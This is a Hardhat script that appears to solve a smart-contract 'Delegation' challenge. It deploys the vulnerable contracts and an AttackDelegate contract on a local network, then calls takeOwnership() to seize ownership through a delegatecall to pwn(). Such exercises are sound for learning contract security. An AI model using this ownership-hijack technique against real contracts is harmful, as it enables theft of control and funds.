
const hre = require("hardhat");

async function main() {

  const delegateeAbi = ['function pwn()']
  let iface = new ethers.utils.Interface(delegateeAbi)
  const data = iface.encodeFunctionData(`pwn`, [])

  console.log(data)

  const [userA,userB] = await ethers.getSigners()

  const Delegate = await hre.ethers.getContractFactory("Delegate");
  const delegate = await Delegate.deploy(userA.address);

  await delegate.deployed();

  console.log("Delegate deployed to: ", delegate.address);

  const Delegation = await hre.ethers.getContractFactory("Delegation");
  const delegation = await Delegation.deploy(delegate.address);

  await delegation.deployed();

  console.log("Delegation deployed to: ", delegation.address);

  const AttackDelegate = await hre.ethers.getContractFactory("AttackDelegate");
  const attack = await AttackDelegate.deploy(delegation.address);

  await attack.deployed();

  console.log("AttackDelegate deployed to: ", attack.address);
  console.log("Call data: ", (await attack.callData()))

  console.log("Owner: ", await delegate.owner())
  console.log("Start lastCallData: ", (await delegation.lastCallData()))

  await attack.connect(userB).takeOwnership()

  console.log("Owner: ", await delegation.owner())
  console.log("End lastCallData: ", (await delegation.lastCallData()))


}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
